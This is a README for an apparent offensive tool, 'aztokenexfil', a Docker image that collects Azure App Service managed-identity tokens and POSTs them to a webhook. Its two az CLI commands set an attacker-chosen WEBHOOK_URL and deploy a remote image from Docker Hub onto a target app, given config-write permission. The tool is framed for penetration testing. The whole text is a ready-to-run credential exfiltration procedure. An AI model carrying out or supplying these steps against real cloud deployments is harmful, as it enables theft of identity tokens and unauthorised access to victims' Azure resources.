# aztokenexfil
Apline based docker container to gather and POST identity tokens from an Azure App Service image deployment.

## Quick guide.

Given the **Microsoft.Web/sites/config/Write** permission over an app service with a default managed identity attached, you can deploy this image to gather its tokens from the identity endpoint. 

Set the WEBHOOK_URL variable in app settings.
```bash
az webapp config appsettings set --resource-group <RG> --name <appname> --settings WEBHOOK_URL=<webhook>
```

Deploy the container
```bash
az webapp config container set --resource-group <RG> --name <appname> --docker-custom-image-name docker.io/jacobham/aztokenexfil:latest
```

You should see tokens come through.
